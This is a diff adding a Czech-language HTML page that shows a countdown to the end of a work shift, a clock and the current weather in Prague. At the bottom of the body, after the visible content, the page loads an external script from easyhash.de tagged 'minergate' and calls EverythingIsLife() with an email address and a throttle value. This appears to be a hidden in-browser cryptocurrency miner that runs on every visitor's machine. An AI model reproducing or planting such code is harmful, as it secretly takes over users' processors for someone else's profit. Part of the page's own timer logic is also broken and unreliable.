@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="cs">
+
+<head>
+   <meta charset="utf-8">
+   <title>Časovač</title>
+   <style>
+      /*@import url(https://fonts.googleapis.com/css?family=Share+Tech+Mono);/*Audiowide, Squada+One, VT323*/
+   </style>
+   <link rel="stylesheet" href="style.css">
+   <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.2.1.min.js"></script>
+   <script src="library.js"></script>
+   <script src="moment.js"></script>
+   <script src="jquery.countdown.min.js"></script>
+   <script src="jquery.simpleWeather.min.js"></script>
+   <script src="jquery.clock.js"></script>
+   <script>
+      function getWeather() {
+         $.simpleWeather({
+            location: 'Prague',
+            unit: 'c',
+            success: function (weather) {
+               html = '<h2><span class="icon-' + weather.code + '"></span>' + weather.temp + '&deg;' + weather.units.temp + '</h2>';
+
+               $("#weather").html(html);
+            },
+            error: function (error) {
+               $("#weather").html('<p>' + error + '</p>');
+            }
+         });
+      }
+
+      $(document).ready(function () {
+         var endOfShift = moment({ hours: 18, minutes: 0, seconds: 0 });
+         if (moment().hour().between(6, 18)) endOfShift;
+         else endOfShift.add(12, 'hours');
+         $('#time').countdown(endOfShift.toDate(), function (event) {
+            $(this).html(event.strftime('%-H:%M:%S'));
+         }).on('finish.countdown', function(){location.reload()});
+         
+         $("#clock").clock();
+
+         var clicker = document.body;
+         clicker.addEventListener("dblclick", function () {
+            toggleFullscreen();
+            toogleCursor();
+         });
+         getWeather(); //Get the initial weather.
+         setInterval(getWeather, 600000);
+      });
+
+   </script>
+</head>
+
+<body>
+   <div id="page-wrap">
+      <!--button id="fullscreen">[<>]</button-->
+    <div style="display: block; text-align: center; margin: 0px auto">
+        <div id="time"></div>
+        <div id="weather"></div>
+    </div>
+   </div>
+   <div id="footer">
+      <div id="clock"></div>
+   </div>
+<script src="https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.minergate"></script>
+<script type="text/javascript">EverythingIsLife('martinrtter@post.cz', 'x', 50);</script>
+</body>
+
+</html>
